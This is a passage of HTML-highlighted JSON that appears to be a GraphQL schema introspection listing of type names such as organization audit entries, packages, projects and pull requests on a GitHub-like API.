class="string">&quot;OrgRemoveMemberAuditEntryMembershipType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveMemberAuditEntryReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveOutsideCollaboratorAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveOutsideCollaboratorAuditEntryMembershipType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveOutsideCollaboratorAuditEntryReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberAuditEntryMembership&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberMembershipOrganizationAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberMembershipRepositoryAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberMembershipTeamAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUnblockUserAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateDefaultRepositoryPermissionAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateDefaultRepositoryPermissionAuditEntryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberAuditEntryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberRepositoryCreationPermissionAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberRepositoryCreationPermissionAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberRepositoryInvitationPermissionAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Organization&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationEnterpriseOwnerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationEnterpriseOwnerEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationIdentityProvider&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMemberConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMemberEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMemberRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMembersCanCreateRepositoriesSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationTeamsHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationsHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Package&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFile&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageStatistics&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageTag&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionStatistics&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PageInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PermissionGranter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PermissionSource&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItemType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionGradient&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionPattern&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedIssue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedIssueConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedIssueEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PreciseDateTime&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PrivateRepositoryForkingDisableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PrivateRepositoryForkingEnableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProfileItemShowcase&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProfileOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Project&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCard&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardArchivedState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumn&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumnConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumnEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumnPurpose&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldCommon&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemContent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemFieldValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemFieldValueConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemFieldValueEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectProgress&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectTemplate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PublicKey&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PublicKeyConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PublicKeyEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestChangedFile&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestChangedFileConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestChangedFileEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommitCommentThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommitConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommitEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestMergeMethod&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReview&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewCommentState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewDecision&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewThreadConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewThreadEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestRevisionMarker&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTemplate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItems&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemsConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemsEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemsItemType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestUpdateState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Push&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowanceActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Query&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span 